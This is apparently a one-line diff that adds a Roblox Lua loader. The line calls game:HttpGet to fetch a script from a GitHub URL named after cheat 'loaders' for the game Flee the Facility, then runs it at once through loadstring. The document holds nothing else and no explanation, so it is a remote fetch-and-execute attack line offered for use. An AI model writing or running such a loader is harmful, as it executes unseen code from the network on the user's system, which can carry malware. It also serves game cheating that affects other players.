@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/flee-the-facility-spam7-dw3o3lr5ocdhe7.lua"))()
